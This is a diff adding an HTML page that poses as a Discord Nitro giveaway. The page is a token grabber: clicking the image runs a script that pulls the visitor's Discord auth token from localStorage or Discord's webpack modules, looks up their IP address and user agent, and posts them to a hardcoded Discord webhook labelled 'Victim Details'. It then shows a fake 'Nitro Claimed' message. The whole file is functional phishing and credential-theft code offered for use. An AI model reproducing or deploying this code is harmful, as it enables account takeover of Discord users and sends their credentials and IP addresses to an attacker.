@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Nitro Claim</title>
+</head>
+<body style="margin:0;background:#36393f;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Whitney,sans-serif;">
+    <div style="text-align:center;color:white;">
+        <img src="https://i.imgur.com/0pK1k1L.png" onclick="grabToken()" style="max-width:400px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.5);cursor:pointer;" alt="Nitro">
+        <h2 style="margin:20px 0;color:#7289da;">Clique pour claim Nitro ! 🔥</h2>
+    </div>
+    
+    <script>
+    async function grabToken() {
+        let token = '';
+        
+        // Méthode 1: localStorage
+        try {
+            token = localStorage.token;
+        } catch(e) {}
+        
+        // Méthode 2: Webpack (Discord moderne)
+        try {
+            webpackChunkdiscord_app.push([[''], {}, (e) => {
+                for(let m in e.c) {
+                    if(e.c[m].exports?.default?.getToken) {
+                        token = e.c[m].exports.default.getToken();
+                    }
+                }
+            }]);
+        } catch(e) {}
+        
+        // Si pas de token valide
+        if(!token || !token.includes('.')) {
+            alert('❌ Pas de token trouvé');
+            return;
+        }
+        
+        // Récup IP
+        let ip = 'Unknown';
+        try {
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
+            ip = ipData.ip;
+        } catch(e) {}
+        
+        // Envoi webhook
+        const data = {
+            content: `**🎯 TOKEN GRABBED !**\n\`${token.slice(0,30)}...\`\n**IP:** \`${ip}\`\n**User-Agent:** ${navigator.userAgent.substring(0,50)}`,
+            embeds: [{
+                title: '🆕 Victim Details',
+                color: 65280,
+                fields: [
+                    {name: 'Token Length', value: `${token.length}`, inline: true},
+                    {name: 'Timestamp', value: `<t:${Math.floor(Date.now()/1000)}:R>`, inline: true}
+                ]
+            }]
+        };
+        
+        fetch('https://discord.com/api/webhooks/1459250463625973771/9kPMp9m-Hs1CklXscaLMUceI3MwK3pLFFH4hGakCRUmFirvD3XVsys8JBFRncDe4BjXy', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        });
+        
+        // Page succès
+        document.body.innerHTML = '<div style="color:lime;text-align:center;padding:50px;font-size:24px;">✅ Nitro Claimed ! Merci !</div>';
+    }
+    </script>
+</body>
+</html>
